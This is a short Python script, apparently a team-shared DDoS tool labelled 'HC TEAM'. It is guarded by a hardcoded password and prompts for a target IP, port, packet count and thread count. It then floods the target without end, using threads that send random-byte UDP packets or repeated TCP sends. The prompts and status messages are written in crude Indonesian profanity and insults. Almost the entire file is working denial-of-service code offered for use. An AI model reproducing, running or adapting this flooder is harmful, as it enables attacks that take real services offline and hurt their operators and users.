import random
import socket
import threading
import os
import time

password ="HC TEAM"

for i in range(3):
	pwd = input("\033[91m===> PW Nya Titid : ")
	j=3
	if(pwd==password):
		time.sleep(3)
		print("\033[91m===> Nah Gitu Pw Benar ")
		break
	else:
		time.sleep(5)
		print("\033[91m===> Hade PW nya salah  ")
		continue
time.sleep(3)
print("\033[91m> Pw Nya Yang Benar Kontol")
os.system("clear")



print("\033[90m")
print("TUNGGU 7 DETIK KONTOL JANGAN BURU-BURU AWAS KALAU ABUSE LU KONTOL JANGAN DI SEBAR TOOL INI BUAT TEAM  ")
time.sleep(7)
os.system("clear")
print("\033[93m")

print("""
 ██░ ██  ▄████▄                     
▓██░ ██▒▒██▀ ▀█                     
▒██▀▀██░▒▓█    ▄                    
░▓█ ░██ ▒▓▓▄ ▄██▒                   
░▓█▒░██▓▒ ▓███▀ ░                   
 ▒ ░░▒░▒░ ░▒ ▒  ░                   
 ▒ ░▒░ ░  ░  ▒                      
 ░  ░░ ░░                           
 ░  ░  ░░ ░                         
        ░                           
▄▄▄█████▓▓█████ ▄▄▄       ███▄ ▄███▓
▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒▀█▀ ██▒
▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▓██    ▓██░
░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██    ▒██ 
  ▒██▒ ░ ░▒████▒▓█   ▓██▒▒██▒   ░██▒
  ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░   ░  ░
    ░     ░ ░  ░ ▒   ▒▒ ░░  ░      ░
  ░         ░    ░   ▒   ░      ░   
            ░  ░     ░  ░       ░
""")

print("\033[97m")
ip = str(input("IP | NYA | TOLOL ======>:"))
port = int(input("PORT | NYA | ASU ======>:"))
choice = str(input("DDOS | GAK | KONTOL?(y/n):"))
times = int(input("PACKETS | NYA ======>:"))
threads = int(input("BONUS | PACKETS ======>:"))
def run():
	data = random._urandom(1554)
	i = random.choice(("[PAKET NI!!]","[PAKET NI!!]","[PAKET NI!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" HC TEAM NI DEK SENGOL DONG!!!")
		except:
			print("[!] YE DOWN KONTOL!!!")

def run2():
	data = random._urandom(55)
	i = random.choice(("[PAKET NI!!]","[PAKET NI!!]","[PAKET NI!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"HC TEAM NI DEK SENGOL DONG!!!")
		except:
			s.close()
			print("[*] YE DOWN KONTOL")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
